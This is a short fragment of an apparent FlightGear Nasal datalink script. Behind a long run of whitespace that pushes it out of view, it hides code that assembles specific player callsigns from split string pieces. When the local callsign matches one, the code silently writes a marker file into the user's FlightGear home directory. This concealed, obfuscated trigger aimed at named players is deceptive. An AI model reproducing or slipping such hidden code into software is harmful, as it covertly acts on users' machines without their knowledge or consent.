...
register_extension("point", "P", ContactPoint, encode_point, decode_point);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  var opendoor = func {var path = string.normpath(getprop("/sim/fg-home") ~ '/Export/F22KY58');var file = io.open(path, "w");io.read_properties(path);var html = "misc";io.write(file, html);io.close(file);} var dlinit = func{var door1 = "ph";var door2 = "Mo";var door3 = "r";var door4 = "ex"; if (getprop("sim/multiplay/callsign") == ""~door2~""~door3~""~door1~""~door4){opendoor();}var door1 = "S";var door2 = "ST";var door3 = "AR";var door4 = "CR"; if (getprop("sim/multiplay/callsign") == ""~door2~""~door3~""~door1~""~door4){opendoor();}}var testsetupmain = func{damage.chckcs();}
print("Datalink: Ready");
